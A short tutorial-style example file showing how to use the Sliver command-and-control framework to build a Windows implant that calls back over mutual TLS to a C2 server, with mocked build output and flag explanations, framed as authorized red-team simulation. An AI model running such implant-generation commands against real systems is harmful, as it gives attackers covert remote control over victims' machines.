# Sliver Examples

## Scenario: Authorized Adversary Simulation (C2 Infrastructure)
Sliver is a command and control (C2) framework used by red teams and security researchers to simulate adversary actions. This helps organizations test their Endpoint Detection and Response (EDR) and SIEM alert configurations.

**Command (Generating a basic beacon payload for simulation):**
```bash
sliver > generate --mtls 10.0.0.50:8888 --os windows --arch amd64 --save /tmp/sim_payload.exe
```

**Mocked Output:**
```text
[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 12 seconds
[*] Implant saved to /tmp/sim_payload.exe
```

**Explanation:**
- `generate`: The Sliver command to compile a new implant (agent).
- `--mtls 10.0.0.50:8888`: Specifies that the implant should use mutual TLS to communicate back to the Sliver C2 server at the specified IP and port.
- `--os windows --arch amd64`: Instructs the builder to target 64-bit Windows operating systems.
- `--save /tmp/sim_payload.exe`: Specifies the output directory and file name for the generated payload, which will be executed in the simulation environment.
